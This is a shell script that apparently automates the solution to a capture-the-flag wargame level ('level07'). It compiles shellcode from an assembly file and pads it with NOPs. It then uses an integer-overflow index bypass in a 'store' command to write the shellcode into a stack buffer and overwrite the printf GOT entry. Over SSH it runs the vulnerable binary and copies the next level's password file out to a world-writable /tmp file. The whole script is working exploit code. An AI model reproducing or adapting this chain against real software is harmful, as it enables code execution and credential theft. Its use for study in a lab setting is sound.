#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)";

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

store() (
    hex_address="${1:-0xFFFFFFFF}";
    raw_index="${2:-0}";
    decimal_payload=$(( hex_address ));
    decimal_index=$(( raw_index % 3 == 0 ? raw_index + (1 << 30) : raw_index ));
    printf "store\n%s\n%s\n" "$decimal_payload" "$decimal_index";
)

generate_hex_shellcode() {
    asm_path="$1";

    if [ -z "$asm_path" ]; then
        log "Error: generate_hex_shellcode requires an assembly source path.";
        return 1;
    elif [ ! -r "$asm_path" ]; then
        log "Error: assembly source '$asm_path' is not readable.";
        return 1;
    fi

    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d) || return 1;

    nasm -f elf32 "$asm_path" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" "x" 1/1 "%02x"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    trap - EXIT INT TERM HUP QUIT;
    unset tmpdir shellcode asm_path;
    return 0;
}

pad_hex_shellcode() {
    hex_shellcode="$1";

    if [ -z "$hex_shellcode" ]; then
        log "Error: pad_hex_shellcode requires a hex shellcode string.";
        return 1;
    fi

    while [ $(( (${#hex_shellcode} / 4) % 4 )) -ne 0 ]; do
        hex_shellcode="\\x90${hex_shellcode}";
    done

    printf "%s" "$hex_shellcode";

    unset hex_shellcode;
    return 0;
}

split_hex_shellcode() {
    hex_shellcode="$1";

    if [ -z "$hex_shellcode" ]; then
        log "Error: split_hex_shellcode requires a hex shellcode string.";
        return 1;
    fi

    printf '%s' "$hex_shellcode" | sed 's/\\x\(..\)\\x\(..\)\\x\(..\)\\x\(..\)/0x\4\3\2\1 /g';

    unset hex_shellcode;
    return 0;
}

build_payload() {
    shellcode_words="$1";

    if [ -z "$shellcode_words" ]; then
        log "Error: build_payload requires the little-endian shellcode words.";
        return 1;
    fi

    index=0;
    for word in $shellcode_words; do
        store "$word" "$index";
        index=$(( index + 1 ));
    done

    buffer_hex_addr='0xffffdc94';
    numeric_printf_got_entry_addr='33632475';
    store "$buffer_hex_addr" "$numeric_printf_got_entry_addr";

    unset shellcode_words index word;
    return 0;
}

# #### #
# MAIN #
# #### #

main() {
    # /!\ $host $port $username and $sshid_password are defined in the source '.sshid.sh' file.
    flag=""

    # Payload(s)

    asm_path="$CURR_DIR_PATH/data/shellcode.asm";
    hex_shellcode="$(generate_hex_shellcode "$asm_path")" || { log "Error: failed to generate shellcode."; return 1; };
    hex_shellcode="$(pad_hex_shellcode "$hex_shellcode")" || return 1;
    shellcode_words="$(split_hex_shellcode "$hex_shellcode")" || return 1;
    payload="$(build_payload "$shellcode_words")" || return 1;

    # Resolution

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket."; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
    {
        printf '%s\n' "cat /home/users/level08/.pass > /tmp/flag.txt";
    } | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%s\n' "$payload"; cat -) | env -i ~/level07";
    flag="$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt")";
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    printf '%s' "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
